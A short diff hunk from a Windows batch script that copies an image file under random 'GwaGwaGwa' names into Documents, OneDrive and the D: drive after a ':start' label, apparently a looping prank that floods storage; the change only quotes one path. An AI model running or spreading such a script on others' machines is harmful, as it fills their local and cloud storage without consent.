@@ -13,7 +13,7 @@ TIMEOUT /T 1 >nul
 :start
 copy %USERPROFILE%\Documents\gwa.jpg %USERPROFILE%\Documents\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg
 
-copy %USERPROFILE%\Documents\gwa.jpg %OneDrive%\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg
+copy %USERPROFILE%\Documents\gwa.jpg "%OneDrive%\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg"
 
 copy %USERPROFILE%\Documents\gwa.jpg D:\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg
 
